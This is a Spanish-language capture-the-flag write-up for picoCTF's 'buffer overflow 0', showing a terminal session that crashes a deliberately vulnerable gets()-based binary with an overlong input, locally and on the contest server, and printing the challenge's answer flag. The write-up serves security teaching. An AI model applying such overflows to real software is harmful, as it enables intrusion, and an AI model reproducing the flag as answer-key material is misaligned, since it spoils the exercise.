# buffer overflow 0


## Descripción
Smash the stackLet's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/174/vuln). You can view source [here](https://artifacts.picoctf.net/c/174/vuln.c). And connect with it using:`nc saturn.picoctf.net 61481`

## Pistas
- How can you trigger the flag to print?
- If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
- Run `man gets` and read the BUGS section. How many characters can the program really read?

## Solución

- Para obtener la bandera hay que desbordar el buffer por lo tanto hay que ingresar mas de 100 caracteres:
``` bash
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ ls
vuln  vuln.c
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ ls -la
total 28
drwxr-xr-x 2 kali kali  4096 may 17 21:59 .
drwxr-xr-x 4 kali kali  4096 may 17 21:58 ..
-rw-r--r-- 1 kali kali 16016 may 17 21:58 vuln
-rw-r--r-- 1 kali kali   808 may 17 21:58 vuln.c
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ chmod +x vuln
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ file vuln    
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b53f59f147e1b0b087a736016a44d1db6dee530c, for GNU/Linux 3.2.0, not stripped
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ ./vuln
Please create 'flag.txt' in this directory with your own debugging flag.
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ echo 'flag{dummienflag}' > flag.txt
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ ./vuln
Input: hooooooolaaaaaaa
The program will exit now
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ ./vuln
Input: hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhoooooooooooooooooooooooooooooooooooooooooolllllllllllllllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
flag{dummienflag}

                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ nc saturn.picoctf.net 61481
Input: hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooollllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef7314c6}
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ 


``` 

## Bandera 
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef7314c6}

